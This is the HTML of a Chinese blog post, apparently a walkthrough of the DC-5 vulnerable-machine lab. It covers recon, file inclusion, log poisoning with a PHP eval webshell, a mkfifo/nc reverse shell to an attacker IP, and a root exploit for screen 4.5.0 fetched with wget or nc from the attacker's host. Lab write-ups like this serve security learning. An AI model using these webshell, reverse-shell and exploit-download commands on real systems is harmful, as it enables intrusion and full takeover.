@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>DC5渗透记录 | 土豆妙妙屋</title><meta name="author" content="inyyy"><meta name="copyright" content="inyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DC5渗透记录一：信息收集使用工具进行扫描网段，查找存活的主机 nmap -sC -sV -T4 -A ip&#x2F;24 nmap -sP ip&#x2F;24  (效率快一点)  扫到了一个存活的开启了80端口web服务的主机，是基于nginx 1.6.2搭建的 dirsearch扫描一下网站目录，有几个200状态码，依次访问一下  footer.php  除了这个其他都在web页面上 进入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC5渗透记录">
+<meta property="og:url" content="https://inyyy.github.io/2025/08/21/DC5%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="土豆妙妙屋">
+<meta property="og:description" content="DC5渗透记录一：信息收集使用工具进行扫描网段，查找存活的主机 nmap -sC -sV -T4 -A ip&#x2F;24 nmap -sP ip&#x2F;24  (效率快一点)  扫到了一个存活的开启了80端口web服务的主机，是基于nginx 1.6.2搭建的 dirsearch扫描一下网站目录，有几个200状态码，依次访问一下  footer.php  除了这个其他都在web页面上 进入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp">
+<meta property="article:published_time" content="2025-08-21T08:57:00.000Z">
+<meta property="article:modified_time" content="2026-01-09T05:44:20.716Z">
+<meta property="article:author" content="inyyy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "DC5渗透记录",
+  "url": "https://inyyy.github.io/2025/08/21/DC5%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/",
+  "image": "https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp",
+  "datePublished": "2025-08-21T08:57:00.000Z",
+  "dateModified": "2026-01-09T05:44:20.716Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "inyyy",
+      "url": "https://inyyy.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://inyyy.github.io/2025/08/21/DC5%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'DC5渗透记录',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">土豆妙妙屋</span></a><a class="nav-page-title" href="/"><span class="site-name">DC5渗透记录</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">DC5渗透记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-21T08:57:00.000Z" title="发表于 2025-08-21 16:57:00">2025-08-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-09T05:44:20.716Z" title="更新于 2026-01-09 13:44:20">2026-01-09</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="DC5渗透记录"><a href="#DC5渗透记录" class="headerlink" title="DC5渗透记录"></a>DC5渗透记录</h1><h2 id="一：信息收集"><a href="#一：信息收集" class="headerlink" title="一：信息收集"></a>一：信息收集</h2><p>使用工具进行扫描网段，查找存活的主机</p>
+<p>nmap -sC -sV -T4 -A ip&#x2F;24</p>
+<p>nmap -sP ip&#x2F;24  (效率快一点)</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019203032034.png" alt="image-20251019203024919"></p>
+<p>扫到了一个存活的开启了80端口web服务的主机，是基于nginx 1.6.2搭建的</p>
+<p>dirsearch扫描一下网站目录，有几个200状态码，依次访问一下</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019205944066.png" alt="image-20251019205944007"></p>
+<p>footer.php</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019210106196.png" alt="image-20251019210106154"></p>
+<p>除了这个其他都在web页面上</p>
+<p>进入域名查看一下，有很多功能，依次查看，发现了在contact里面可能存在漏洞，源码里面看了一下，找不到参数的渲染方式，没有什么可利用的</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019203309935.png" alt="image-20251019203309814"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019203546871.png" alt="image-20251019203546786"></p>
+<p>看到这个输入框怀疑存在xss，写一个简单的xss脚本验证一下</p>
+<script>alert('111')</script>
+
+<p>​    </p>
+<p>结果并没有回显，直接被重定向到了thankyou.php</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019210331965.png" alt="image-20251019210331916"></p>
+<p>但是在返回页面的底部看到了之前访问的footer.php的返回，说明thankyou.php包含了footer.php，可能存在文件包含漏洞</p>
+<h2 id="二：利用文件包含渗透"><a href="#二：利用文件包含渗透" class="headerlink" title="二：利用文件包含渗透"></a>二：利用文件包含渗透</h2><p>本地包含试一下</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019210941327.png" alt="image-20251019210941246"></p>
+<p>有返回，确实存在文件包含</p>
+<p>写一个一句话木马进日志文件</p>
+<p>?file&#x3D;<?php @eval($_POST['sh']); ?></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019212910674.png" alt="image-20251019212910623"></p>
+<p>看一下日志文件有没有执行成功，查了一下nginx 1.6.2的日志文件位置在var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019213157559.png" alt="image-20251019213157496"></p>
+<p>成功写入，打开蚁剑连接（虽然日志文件是纯文本内容，但是因为这个日志文件可以被web服务访问，所以还是进行了php解析）</p>
+<p>但是连接时发现数据为空，php没有被执行，可能前端存在waf</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019214717649.png" alt="image-20251019214717600"></p>
+<p>仔细看了一下发现符号&lt;被转义了，抓包修改上传试一下，看是不是因为前端js检测</p>
+<p><img src="C:\Users\a7787\AppData\Roaming\Typora\typora-user-images\image-20251019215344960.png" alt="image-20251019215344960"></p>
+<p>再次访问日志文件，这次发现木马没有被转义</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019215459130.png" alt="image-20251019215459061"></p>
+<p>打开蚁剑成功连接，打开虚拟终端，弹一个反向shell到kali上，kali开启监听</p>
+<p>nc -lvp 4444</p>
+<p>目标利用mkfifo与kali建立管道</p>
+<p>mkfifo &#x2F;tmp&#x2F;f; cat &#x2F;tmp&#x2F;f | &#x2F;bin&#x2F;sh -i 2&gt;&amp;1 | nc 192.168.20.130 4444 &gt; &#x2F;tmp&#x2F;f</p>
+<p>建立连接后升级shell交互，建立tty</p>
+<p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
+<h2 id="三：提权"><a href="#三：提权" class="headerlink" title="三：提权"></a>三：提权</h2><p>查找一下suid权限的文件，看看哪些可以利用</p>
+<p>find  &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251019220250672.png" alt="image-20251019220250606"></p>
+<p>有一个screen工具可用，4.5.0版本存在一个本地提权的CVE，利用msf进行exp利用</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251021163121294.png" alt="image-20251021163114052"></p>
+<p>kali利用python开启一个http服务</p>
+<p>python3 -m http.server 8000</p>
+<p>靶机使用wget下载文件并赋权,注意下载时进入tmp目录，其他目录可能没有写入权限</p>
+<p>wget <a target="_blank" rel="noopener" href="http://192.168.20.130:8000/41154.sh">http://192.168.20.130:8000/41154.sh</a> -o 别名</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251021164326894.png" alt="image-20251021164326844"></p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251021165147162.png" alt="image-20251021165146997"></p>
+<p>这里我使用wget下载文件时，文件内容被wget的输出内容污染了，无法编译。所以我换成了nc进行传递</p>
+<p>nc 192.168.20.130 8888 &gt; five.sh</p>
+<p>成功提权到root。</p>
+<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251021165517566.png" alt="image-20251021165517488"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://inyyy.github.io">inyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://inyyy.github.io/2025/08/21/DC5%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">https://inyyy.github.io/2025/08/21/DC5%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://inyyy.github.io" target="_blank">土豆妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/27/drupal-7-DC-1-%E9%9D%B6%E5%9C%BA%E6%B5%8B%E8%AF%95/" title="drupal 7 DC-1 靶场测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">drupal 7 DC-1 靶场测试</div></div><div class="info-2"><div class="info-item-1">drupal 7 DC-1靶场渗透记录信息收集部分节约时间的话可以在火狐安装wappalyzer  插件 可直接查看网站的一些信息 不过信息很少 一：信息收集先用nmap扫描网段192.168.56.0上存货的主机，去找到攻击的机器，扫描完主机后扫描目标ip上是否有可用的端口信息，当存货的主机很多难以判断时我们可以通过mac地址去判断，mac地址就相当于计算机的身份证，扫描到的信息上可以看到这个web服务的框架，是drupal 7版本的，可以去网上查一下是否有现成的漏洞，找现成的exp去打  这里扫出来的端口没有一个有用的 充分利用工具，除了扫描端口之外还可以用目录扫描工具看一下有没有可以访问的文件去提取一下i信息  根据扫到的存活主机进入到主站  主站有一个登录框，这里是动态的，和后端数据库存在交互，可以尝试sql注入一下，用万能钥匙爆破，也可以弱密码爆破（不过要小心ip被ban） 在主站看一下相关功能，看有没有可以利用的来获得信息的功能，这里有一个注册账号功能，可以注册一个账户看看，还有一个修改密码的功能，不过没有邮箱，利用率不大 二，利用msf进行exp这里主站是一个dru...</div></div></div></a><a class="pagination-related" href="/2025/08/18/DC4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="DC4渗透测试"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DC4渗透测试</div></div><div class="info-2"><div class="info-item-1">DC4渗透记录一：信息收集使用nmap进行网段扫描 namp -sV -sC -T4 -A ip&#x2F;24   24是cidr值，指定子网规模  这里扫描到一个开启了web服务的主机，根据返回来看应该不是一个cms，火狐搜索一下  进入后是一个管理员登录框，随便输入一组数据发现前端没有渲染回任何信息 用dirsearch扫描一下，看有没有泄露的可用文件 dirsearch -u url  这里看到有三个功能页面，但是都被重定向回了登录界面，必须要管理员权限才可以访问，只能对登录框进行操作 二：对登录框进行爆破1.万能密码爆破随便输入一组数据进行抓包，抓波后发现请求包中并没有token，也没有对参数进行前端加密，直接爆破就行  回显都是失败，换弱密码爆破 2.弱口令爆破 这里happy的返回长度不一样，渲染模式下可以看出登录成功，得到用户admin，密码happy 三：进入管理员系统进行下一步渗透进入后发现只有登录，退出和命令执行三个功能，很明显目标就是command功能，在里面可以执行系统命令  进去之后发现就只有这三个命令功能，f12看一下源码，没有收获，抓包试试看  返...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">inyyy</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/inyyy/inyyy.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC5%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95"><span class="toc-number">1.</span> <span class="toc-text">DC5渗透记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">一：信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%9A%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">二：利用文件包含渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%EF%BC%9A%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">三：提权</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/11/oasy%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="oasy代码审计">oasy代码审计</a><time datetime="2025-11-10T16:16:19.000Z" title="发表于 2025-11-11 00:16:19">2025-11-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/08/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="shiro550反序列化">shiro550反序列化</a><time datetime="2025-11-08T11:19:03.000Z" title="发表于 2025-11-08 19:19:03">2025-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/30/cc6-HashMap%E9%93%BE/" title="cc6-HashMap链">cc6-HashMap链</a><time datetime="2025-10-30T10:59:19.000Z" title="发表于 2025-10-30 18:59:19">2025-10-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/" title="cc4的TemplatesImpl字节码链">cc4的TemplatesImpl字节码链</a><time datetime="2025-10-28T09:49:01.000Z" title="发表于 2025-10-28 17:49:01">2025-10-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/28/cc2%E9%93%BE%E7%9A%84InvokerTransformer%E9%93%BE/" title="cc2链的InvokerTransformer链">cc2链的InvokerTransformer链</a><time datetime="2025-10-28T09:46:23.000Z" title="发表于 2025-10-28 17:46:23">2025-10-28</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By inyyy</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.0</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
